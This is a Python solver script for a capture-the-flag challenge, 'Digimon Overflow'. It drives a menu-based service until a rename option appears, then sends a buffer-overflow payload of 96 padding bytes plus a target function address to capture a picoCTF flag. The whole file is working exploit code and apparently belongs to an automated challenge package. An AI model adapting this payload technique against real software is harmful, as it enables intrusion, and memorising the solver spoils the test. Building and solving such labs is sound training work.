#!/usr/bin/env python3
#!/usr/bin/env python3
"""
CMGR Automated Solver for Digimon Overflow
Uses a partial pointer overwrite at offset 96.
"""

import sys
import socket
import os
import time

TARGET_ADDR = 0x401216  # Address of wargreymon_appears (Docker binary)
# Offset 96 works for direct stdin, but PTY causes different heap layout
# For now, the challenge needs pty removed from start.sh for consistent heap
OFFSET = 96


def create_payload():
    padding = b"A" * OFFSET
    # 64-bit little-endian address
    target_bytes = TARGET_ADDR.to_bytes(8, 'little')
    return padding + target_bytes


def solve():
    host = os.environ.get("CHAL_HOST", "challenge")
    port = int(os.environ.get("CHAL_PORT", "9999"))
    if "CHAL_HOST" not in os.environ or "CHAL_PORT" not in os.environ:
        print("[*] CHAL_HOST/CHAL_PORT not provided; defaulting to challenge:9999", file=sys.stderr)

    print(f"[*] Targeting {host}:{port}", file=sys.stderr)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    def recv_until(marker):
        data = b""
        while marker not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        return data

    def send_line(data):
        sock.sendall(data + b"\n")
        time.sleep(0.05)

    def press_enter_prompt():
        recv_until(b"Press Enter to continue")
        send_line(b"")
        recv_until(b"Enter choice:")

    try:
        recv_until(b"Enter choice:")

        send_line(b"1")
        recv_until(b"name:")
        send_line(b"Agumon")
        press_enter_prompt()

        # Train until option 6 appears (exp >= 50)
        # Experience gain is random 5-15, so we need to check
        max_attempts = 20
        found_option_6 = False
        for i in range(max_attempts):
            send_line(b"2")
            recv_until(b"Press Enter to continue")
            send_line(b"")
            menu_data = recv_until(b"Enter choice:")
            if b"6. Digivolve" in menu_data:
                print(f"[*] Found digivolve option after {i+1} training sessions", file=sys.stderr)
                found_option_6 = True
                break
        
        if not found_option_6:
            print("[!] Never found digivolve option after max training", file=sys.stderr)
            return False

        send_line(b"6")
        recv_until(b"new name:")
        payload = create_payload()
        send_line(payload)
        
        # Wait for the wargreymon output
        sock.settimeout(2)
        response = b""
        deadline = time.time() + 10
        while time.time() < deadline:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"picoCTF{" in response or b"FLAG:" in response:
                    break
            except socket.timeout:
                # Send enter to continue if needed
                try:
                    send_line(b"")
                except:
                    pass
                continue

        if b"picoCTF{" not in response:
            print(f"[!] Flag not found in response ({len(response)} bytes received)", file=sys.stderr)
            print(f"[DEBUG] Last 500 bytes: {response[-500:]}", file=sys.stderr)
            return False

        flag_start = response.find(b"picoCTF{")
        flag_data = response[flag_start:]
        flag_end = flag_data.find(b"\n")
        if flag_end != -1:
            flag = flag_data[:flag_end].decode().strip()
        else:
            flag = flag_data.decode().strip()

        with open("flag", "w") as f:
            f.write(flag)
        print(f"[+] Flag found: {flag}", file=sys.stderr)
        return True

    finally:
        sock.close()


if __name__ == "__main__":
    try:
        success = solve()
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal error: {e}", file=sys.stderr)
        sys.exit(1)
